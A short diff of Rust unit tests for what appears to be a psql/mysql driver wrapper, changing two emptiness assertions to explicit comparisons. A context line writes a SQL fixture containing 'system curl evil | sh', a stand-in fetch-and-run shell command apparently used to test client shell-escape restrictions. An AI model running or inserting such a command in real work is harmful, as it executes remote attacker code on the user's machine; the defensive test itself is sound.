@@ -892,7 +892,7 @@ mod tests {
         else {
             panic!("seen, the file goes to psql");
         };
-        assert!(prelude.is_empty());
+        assert_eq!(prelude, Vec::<u8>::new());
 
         std::fs::write(&sql, "SELECT 1;\nsystem curl evil | sh\n").unwrap();
         config.driver = DriverKind::MySql;
@@ -923,7 +923,7 @@ mod tests {
             psql_restriction("\\restrict K"),
             psql_restriction("\\restrict K")
         );
-        assert!(psql_restriction("  \\q  quit psql\n").is_empty());
+        assert_eq!(psql_restriction("  \\q  quit psql\n"), Vec::<u8>::new());
 
         let mysql = "  --binary-mode       By default, ASCII '\\0' is disallowed\n\
                      expired password sandbox mode.\n\
